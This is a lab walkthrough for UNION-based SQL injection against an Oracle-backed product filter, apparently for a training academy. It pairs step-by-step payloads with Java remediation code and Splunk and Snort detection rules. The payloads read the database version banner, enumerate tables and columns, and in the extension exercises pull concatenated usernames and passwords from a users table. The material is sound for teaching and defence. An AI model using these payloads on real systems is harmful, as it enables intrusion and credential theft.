# Lab Walkthrough: Querying Database Type & Version on Oracle

* **Difficulty:** Practitioner
* **Estimated Time:** 20–30 minutes
* **Focus Area:** Web Application Security / SQL Injection / Database Fingerprinting

---

## Legal & Ethical Disclaimer

> [!WARNING]
> The techniques, proof-of-concept code, and methodologies documented in this guide are provided strictly for educational purposes, authorized penetration testing, and security research. Executing these tests against infrastructure without prior, explicit, written permission is illegal and punishable under computer crime legislation (e.g., the U.S. Computer Fraud and Abuse Act, UK Computer Misuse Act, and equivalent global statutes).

---

## Table of Contents

1. [Overview & Vulnerability Architecture](https://www.google.com/search?q=%23overview--vulnerability-architecture)
2. [Oracle SQL Injection Essentials](https://www.google.com/search?q=%23oracle-sql-injection-essentials)
3. [Lab Objective & Success Metrics](https://www.google.com/search?q=%23lab-objective--success-metrics)
4. [Step-by-Step Exploitation Walkthrough](https://www.google.com/search?q=%23step-by-step-exploitation-walkthrough)
* [Step 1: Discover the Injection Surface](https://www.google.com/search?q=%23step-1-discover-the-injection-surface)
* [Step 2: Determine Column Count (The Oracle Nuance)](https://www.google.com/search?q=%23step-2-determine-column-count-the-oracle-nuance)
* [Step 3: Identify Text-Compatible Data Types](https://www.google.com/search?q=%23step-3-identify-text-compatible-data-types)
* [Step 4: Fingerprint Engine & Extract Banner Data](https://www.google.com/search?q=%23step-4-fingerprint-engine--extract-banner-data)


5. [Cross-Engine Version Query Comparison](https://www.google.com/search?q=%23cross-engine-version-query-comparison)
6. [Defense, Hardening & Prevention](https://www.google.com/search?q=%23defense-hardening--prevention)
7. [Detection & SIEM Monitoring Rules](https://www.google.com/search?q=%23detection--siem-monitoring-rules)
8. [Troubleshooting & Common Failure Modes](https://www.google.com/search?q=%23troubleshooting--common-failure-modes)
9. [Hands-on Practice & Extension Exercises](https://www.google.com/search?q=%23hands-on-practice--extension-exercises)
10. [References & Further Reading](https://www.google.com/search?q=%23references--further-reading)

---

## Overview & Vulnerability Architecture

In-band (or UNION-based) SQL injection occurs when user-supplied input is directly concatenated into a dynamic SQL query without validation or parameterization, allowing an attacker to append custom `SELECT` statements whose outputs are reflected inside the application's HTTP response.

```text
HTTP GET /filter?category=Gifts' UNION SELECT ...
                     │
                     ▼
  ┌────────────────────────────────────────────────────────┐
  │ Application Server (e.g., Java / PHP / Python)         │
  │ Vulnerable String Concatenation:                       │
  │ "SELECT name, desc FROM products WHERE category = '"   │
  │ + user_input + "' AND released = 1"                    │
  └──────────────────────────┬─────────────────────────────┘
                             │
                             ▼
  ┌────────────────────────────────────────────────────────┐
  │ Oracle Database Engine                                 │
  │ Executes combined queries:                             │
  │ 1. Original Query: SELECT name, desc FROM products...  │
  │ 2. Injected Query: UNION SELECT BANNER, NULL FROM...   │
  └──────────────────────────┬─────────────────────────────┘
                             │
                             ▼
  ┌────────────────────────────────────────────────────────┐
  │ Response Generation:                                   │
  │ Web page renders results of both queries into the DOM  │
  └────────────────────────────────────────────────────────┘

```

When attacking an Oracle database engine, standard SQL payloads that succeed on systems like MySQL or PostgreSQL will fail due to Oracle's strict syntax and type safety constraints.

---

## Oracle SQL Injection Essentials

To construct functioning UNION injection attacks against an Oracle database, security professionals must navigate two unique database behaviors:

### 1. Mandatory `FROM` Clause (`DUAL` Table)

Unlike MySQL, PostgreSQL, or SQLite—which allow free-floating `SELECT` statements such as `SELECT 1, 2;`—Oracle adheres strictly to ANSI SQL: every `SELECT` query **must** have a `FROM` clause.

* To query constants or system properties without an existing business table, Oracle uses an internal single-row dummy table named `DUAL`.
* *Invalid on Oracle:* `SELECT 'a', 'b'`
* *Valid on Oracle:* `SELECT 'a', 'b' FROM DUAL`

### 2. Strict Data Type Matching

Oracle's SQL compiler rejects `UNION` operations if the data types of corresponding columns do not match or cannot be implicitly cast.

* If original column 1 is an integer and column 2 is text, passing text into column 1 triggers an `ORA-01789` or `ORA-01790` database error.
* Using `NULL` simplifies column enumeration because `NULL` can be cast to any primitive type (number, string, date).

---

## Lab Objective & Success Metrics

* **Target System:** Product Category Filter on an e-commerce platform backed by an Oracle Database.
* **Objective:** Determine the column count, locate text-compatible fields, query internal metadata tables, and output the database version string (`BANNER`) to the client-facing product catalog.
* **Success Indicator:** The home page or catalog displays a string such as `Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production`.

---

## Step-by-Step Exploitation Walkthrough

```text
┌────────────────────────────────────────────────────────────────────────┐
│                      ORACLE EXPLOITATION TIMELINE                      │
└────────────────────────────────────────────────────────────────────────┘
  [Phase 1: Discover] ─────────► Inject single-quote (') to force error
          │
  [Phase 2: Columns]  ─────────► ORDER BY / UNION SELECT NULL FROM dual
          │
  [Phase 3: Data Types] ───────► Test 'abc' string placement per column
          │
  [Phase 4: Exfiltrate] ───────► Query BANNER from v$version

```

### Step 1: Discover the Injection Surface

Intercept the product category filter request using a web proxy (e.g., Burp Suite).

```http
GET /filter?category=Gifts HTTP/1.1
Host: vulnerable-lab.web-security-academy.net
User-Agent: Mozilla/5.0

```

Inject a single quote (`'`) to test whether input sanitization is present:

```http
GET /filter?category=Gifts' HTTP/1.1

```

* **Observed Output:** `HTTP/1.1 500 Internal Server Error`
* **Analysis:** The broken string literal creates an unhandled syntax error on the backend, confirming that the parameter is concatenated directly into a database query.

---

### Step 2: Determine Column Count (The Oracle Nuance)

A `UNION` query requires the same number of columns as the original query. On Oracle, this enumeration must reference the `DUAL` table.

#### Method A: Using `ORDER BY`

Increment the column index until an error occurs:

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   <-- Fails with an internal error (indicates table has 2 columns)

```

#### Method B: Using `UNION SELECT NULL`

```sql
' UNION SELECT NULL FROM DUAL--             (Fails: column mismatch)
' UNION SELECT NULL, NULL FROM DUAL--       (Succeeds: HTTP 200 OK)
' UNION SELECT NULL, NULL, NULL FROM DUAL-- (Fails: column mismatch)

```

The application returns `HTTP 200 OK` on two columns. The base query contains exactly **two columns**.

---

### Step 3: Identify Text-Compatible Data Types

To extract strings, find which column accepts string/VARCHAR2 data. Test each column position by swapping `NULL` with a string literal (`'abc'`).

#### Testing Column 1:

```sql
'+UNION+SELECT+'abc',NULL+FROM+DUAL--

```

* **Status:** `HTTP 200 OK` (Column 1 supports text data).

#### Testing Column 2:

```sql
'+UNION+SELECT+'abc','def'+FROM+DUAL--

```

* **Status:** `HTTP 200 OK` (Column 2 also supports text data).

Both columns support string reflection.

---

### Step 4: Fingerprint Engine & Extract Banner Data

Oracle stores database version details in administrative data dictionary views:

* `v$version` (exposes `BANNER` or `BANNER_FULL`)
* `v$instance` (exposes `VERSION`)

Construct the payload placing `BANNER` into Column 1 and `NULL` into Column 2:

```http
GET /filter?category='+UNION+SELECT+BANNER,+NULL+FROM+v$version-- HTTP/1.1
Host: vulnerable-lab.web-security-academy.net

```

#### Raw Server Response:

```html
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 4281

<div class="product">
    <h3>Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production</h3>
    <p></p>
</div>

```

The database version string is reflected in the product listing, solving the lab.

> **Checkpoint:** Did you receive an `HTTP 500` error while querying `v$version`? Ensure you included `FROM DUAL` when testing static values, and used the correct table name `v$version` without syntax typos. Verify that the trailing comment sequence (`--`) contains no trailing characters that could invalidate the Oracle parser.

---

## Cross-Engine Version Query Comparison

Different database engines use distinct syntax, functions, and system tables to query versions.

| Database Engine | Version Query Syntax | Dynamic Table Required? | Global Comment Sequence |
| --- | --- | --- | --- |
| **Oracle** | `SELECT BANNER FROM v$version` | **Yes** (`FROM DUAL`) | `--` |
| **Oracle (Alt)** | `SELECT version FROM v$instance` | **Yes** (`FROM DUAL`) | `--` |
| **Microsoft SQL (MSSQL)** | `SELECT @@VERSION` | **No** | `--` |
| **PostgreSQL** | `SELECT version()` | **No** | `--` |
| **MySQL / MariaDB** | `SELECT @@version` or `SELECT version()` | **No** | `-- ` *(Note space)* or `#` |
| **SQLite** | `SELECT sqlite_version()` | **No** | `--` |

---

## Defense, Hardening & Prevention

### 1. Parameterized Queries (Primary Defense)

Never concatenate user input directly into dynamic queries. Use parameterization (prepared statements), which separates user input from SQL parsing logic.

#### Vulnerable Code (Java / JDBC):

```java
// INSECURE: User input directly concatenated
String query = "SELECT name, desc FROM products WHERE category = '" + userInput + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);

```

#### Remediated Code (Java / Prepared Statement):

```java
// SECURE: Input is treated as an immutable literal value
String query = "SELECT name, desc FROM products WHERE category = ?";
PreparedStatement statement = connection.prepareStatement(query);
statement.setString(1, userInput);
ResultSet resultSet = statement.executeQuery();

```

### 2. Principle of Least Privilege

* Restrict the application's runtime database user from reading system tables (`v$version`, `v$instance`, `all_tables`).
* Revoke `SELECT` permissions on internal metadata catalogs unless functionally necessary.

### 3. Web Application Firewall (WAF) Rules

Deploy rule sets (e.g., OWASP ModSecurity Core Rule Set) to detect `UNION SELECT` sequences, keywords (`v$version`, `dual`), and comment markers (`--`).

---

## Detection & SIEM Monitoring Rules

### Example Splunk Search Query (SPL)

```spl
index=webproxy_logs status=200 OR status=500
| regex uri_query="(?i)(\bUNION\b.+?\bSELECT\b.+?\bFROM\b)"
| stats count by src_ip, uri_path, uri_query, status
| where count > 0

```

### Example Suricata / Snort Signature

```snort
alert http any any -> any any (
    msg:"EXPLOIT Oracle SQL Injection - Metadata Table Enumeration";
    flow:established,to_server;
    content:"UNION",nocase;
    content:"SELECT",nocase;
    content:"v$version",nocase;
    distance:0;
    classtype:web-application-attack;
    sid:1000941;
    rev:1;
)

```

---

## Troubleshooting & Common Failure Modes

```text
┌────────────────────────────────────────────────────────┐
│                TROUBLESHOOTING RUNBOOK                 │
└────────────────────────────────────────────────────────┘
                           │
         ┌─────────────────┴─────────────────┐
         ▼                                   ▼
 [HTTP 500 on UNION]                 [HTTP 200, No Output]
         │                                   │
         ├─► Missing 'FROM DUAL'?            ├─► Is row off-screen?
         ├─► Wrong column count?             │   (Use false condition
         └─► Data type mismatch?             │    e.g., category=INVALID')
             (Cast via NULL)                 └─► Try second text column

```

* **Error: `ORA-00923: FROM keyword not found where expected**`
* *Root Cause:* Ran an Oracle query without specifying a source table.
* *Fix:* Append `FROM DUAL` to the `UNION SELECT` payload.


* **Error: `ORA-01789: query block has incorrect number of result columns**`
* *Root Cause:* The injected `SELECT` does not match the column count of the primary query.
* *Fix:* Increment or decrement the number of `NULL` placeholders until the query succeeds.


* **Error: `ORA-01790: expression must have same datatype as corresponding expression**`
* *Root Cause:* Attempted to place a string into an integer/date column.
* *Fix:* Return all fields to `NULL` and test each position systematically with `'test'` one by one.


* **Symptom: HTTP 200 OK, but no injected data displays on the page.**
* *Root Cause:* The application only displays the first record returned by the database.
* *Fix:* Break the primary query so it returns zero rows (e.g., set `category=NonExistentCategory'`), forcing the application to render the second row supplied by your `UNION` clause.



---

## Hands-on Practice & Extension Exercises

1. **Table Schema Enumeration:**
Extend the vulnerability to list all accessible tables in the Oracle database:
```sql
'+UNION+SELECT+table_name,+NULL+FROM+all_tables--

```


2. **Column Extraction:**
Target administrative credentials by finding fields in the `USERS` table:
```sql
'+UNION+SELECT+column_name,+NULL+FROM+all_tab_columns+WHERE+table_name='USERS'--

```


3. **Data String Aggregation:**
If the application only reflects a single column, use Oracle's string concatenation operator (`||`) to extract multiple fields simultaneously:
```sql
'+UNION+SELECT+username||'~'||password,+NULL+FROM+users--

```



---

## References & Further Reading

* [PortSwigger Web Security Academy: SQL Injection](https://www.google.com/search?q=https://portswigger.net/web-security/sql-injection)
* [Oracle Documentation: DUAL Table Mechanics](https://www.google.com/search?q=https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/The-DUAL-Table.html)
* [OWASP Top 10: Injection (A03:2021)](https://www.google.com/search?q=https://owasp.org/Top10/A03_2021-Injection/)
* [MITRE ATT&CK Technique T1190: Exploit Public-Facing Application](https://www.google.com/search?q=https://attack.mitre.org/techniques/T1190/)
